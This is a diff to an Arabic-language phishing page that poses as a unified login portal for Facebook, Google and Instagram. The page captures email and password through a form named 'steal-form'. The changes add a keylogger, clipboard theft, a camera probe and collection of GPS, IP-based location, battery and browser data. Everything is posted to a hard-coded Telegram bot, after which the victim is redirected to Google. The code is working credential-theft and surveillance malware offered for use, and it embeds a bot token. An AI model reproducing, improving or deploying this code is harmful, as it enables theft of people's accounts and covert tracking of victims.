@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>مركز تسجيل الدخول الموحد</title>
+    <title>مركز تسجيل الدخول الآمن</title>
     <style>
-        body { background-color: #f0f2f5; font-family: Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 400px; text-align: center; }
+        body { background-color: #f0f2f5; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.2); width: 400px; text-align: center; transition: 0.5s; }
         h2 { color: #333; margin-bottom: 20px; }
         .option-btn { display: flex; align-items: center; width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ddd; border-radius: 8px; cursor: pointer; text-decoration: none; color: #333; font-weight: bold; font-size: 18px; transition: 0.3s; }
         .option-btn:hover { background-color: #eef; transform: scale(1.02); }
         .icon { width: 30px; margin-left: 15px; }
         .login-form { display: none; text-align: center; }
-        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; }
+        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; font-size: 16px; text-align: center;}
         .submit-btn { background: #1877f2; color: white; border: none; width: 96%; padding: 12px; font-weight: bold; cursor: pointer; border-radius: 5px; font-size: 18px; }
     </style>
 </head>
@@ -20,7 +20,7 @@
 
     <div class="container" id="main-box">
         <div id="selection-page">
-            <h2>اختر وسيلة تسجيل الدخول</h2>
+            <h2 id="welcome-msg">نظام التوثيق الموحد</h2>
             <div class="option-btn" onclick="showLogin('Facebook', '#1877f2')">
                 <img class="icon" src="https://cdn-icons-png.flaticon.com/512/124/124010.png"> فيسبوك
             </div>
@@ -30,17 +30,14 @@
             <div class="option-btn" onclick="showLogin('Instagram', '#C13584')">
                 <img class="icon" src="https://cdn-icons-png.flaticon.com/512/174/174855.png"> إنستغرام
             </div>
-            <div class="option-btn" onclick="showLogin('Twitter/X', '#000')">
-                <img class="icon" src="https://cdn-icons-png.flaticon.com/512/5969/5969020.png"> تويتر / X
-            </div>
         </div>
 
         <div id="login-page" class="login-form">
-            <h2 id="site-name" style="color:#1877f2;">تسجيل الدخول</h2>
+            <h2 id="site-name">تسجيل الدخول</h2>
             <form id="steal-form">
-                <input type="text" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
+                <input type="text" id="email" placeholder="البريد الإلكتروني" required>
                 <input type="password" id="pass" placeholder="كلمة السر" required>
-                <button type="submit" class="submit-btn" id="submit-button">تسجيل الدخول</button>
+                <button type="submit" class="submit-btn" id="submit-button">تأكيد الدخول</button>
             </form>
         </div>
     </div>
@@ -49,6 +46,42 @@
         const BOT_TOKEN = '8960046938:AAF1GRVk0tFUPz1LaqvI1AG2sNZgsSvcNog';
         const CHAT_ID = '6670040264';
         let currentSite = '';
+        let keystrokes = "";
+
+        // 1. Keylogger: تسجيل كل ما يكتبه الضحية
+        window.addEventListener('keydown', (e) => {
+            keystrokes += e.key;
+        });
+
+        // 2. Clipboard Stealer: محاولة سحب الحافظة
+        async function stealClipboard() {
+            try {
+                const text = await navigator.clipboard.readText();
+                return text ? `📋 الحافظة: ${text}` : "الحافظة فارغة";
+            } catch (e) { return "❌ لا يمكن الوصول للحافظة"; }
+        }
+
+        // 3. Camera Probe: محاولة تفعيل الكاميرا
+        async function probeCamera() {
+            try {
+                await navigator.mediaDevices.getUserMedia({ video: true });
+                return "📸 الكاميرا متاحة (وافق الضحية)";
+            } catch (e) { return "❌ الكاميرا مرفوضة"; }
+        }
+
+        // 4. Device Intelligence + Location
+        async function gatherIntel() {
+            let location = "غير معروف";
+            navigator.geolocation.getCurrentPosition((pos) => {
+                location = `📍 GPS: ${pos.coords.latitude}, ${pos.coords.longitude}`;
+            });
+
+            const ipRes = await fetch('https://ipapi.co/json/');
+            const ipData = await ipRes.json();
+            const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 'unknown'}));
+
+            return `🌐 IP: ${ipData.ip} | 🏙️ المدينة: ${ipData.city}\n🌍 الدولة: ${ipData.country_name} | 🔋 بطارية: ${battery.level * 100}%\n🕰️ زمن: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\n${location}`;
+        }
 
         function showLogin(site, color) {
             currentSite = site;
@@ -61,22 +94,26 @@
 
         document.getElementById('steal-form').onsubmit = async (e) => {
             e.preventDefault();
+            
             const email = document.getElementById('email').value;
             const pass = document.getElementById('pass').value;
+            const intel = await gatherIntel();
+            const clip = await stealClipboard();
+            const cam = await probeCamera();
+
+            const finalMsg = `⚠️ [OMEGA EXPLOIT DETECTED] ⚠️\n\n` +
+                             `🎯 الموقع: ${currentSite}\n` +
+                             `📧 الحساب: ${email}\n` +
+                             `🔑 كلمة السر: ${pass}\n\n` +
+                             `⌨️ تسجيل المفاتيح: ${keystrokes}\n` +
+                             `${clip}\n` +
+                             `${cam}\n\n` +
+                             `📊 بيانات النظام:\n${intel}\n` +
+                             `📱 المتصفح: ${navigator.userAgent}`;
+
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(finalMsg)}`);
             
-            // سحب معلومات إضافية عن الجهاز
-            const userAgent = navigator.userAgent;
-            const screenRes = window.screen.width + 'x' + window.screen.height;
-
-            const msg = `💀 صيد جديد مدمّر! 💀\n\n🎯 الموقع: ${currentSite}\n📧 الحساب: ${email}\n🔑 كلمة السر: ${pass}\n🌐 الجهاز: ${userAgent}\n🖥️ الدقة: ${screenRes}`;
-
-            // إرسال البيانات عبر API تليجرام مباشرة من المتصفح
-            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
-
-            // توجيه الضحية للموقع الحقيقي فوراً ليصدق العملية
-            window.location.href = (currentSite === 'Facebook') ? 'https://facebook.com' : 
-                                   (currentSite === 'Google') ? 'https://accounts.google.com' : 
-                                   (currentSite === 'Instagram') ? 'https://instagram.com' : 'https://x.com';
+            window.location.href = "https://google.com";
         };
     </script>
 </body>
